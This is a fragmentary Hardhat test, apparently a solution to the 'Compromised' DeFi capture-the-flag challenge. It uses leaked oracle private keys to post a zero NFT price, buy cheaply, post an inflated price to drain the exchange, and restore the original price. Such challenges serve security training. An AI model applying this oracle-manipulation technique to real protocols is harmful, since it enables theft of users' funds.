...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * The main api response contains the private keys of the oracle, so the main ideia is to change
     * the nft price to 0, buy one NFT, then change the price to exchange balance and sell the nft
     * And to pass all the test we need to change again to initial price
     */

    const oracle0 = new ethers.Wallet(oracleKey0, ethers.provider);
    const oracle1 = new ethers.Wallet(oracleKey1, ethers.provider);

    await this.oracle.connect(oracle0).postPrice("DVNFT", 0);
    ...
    await this.oracle.connect(oracle0).postPrice("DVNFT", INITIAL_NFT_PRICE);
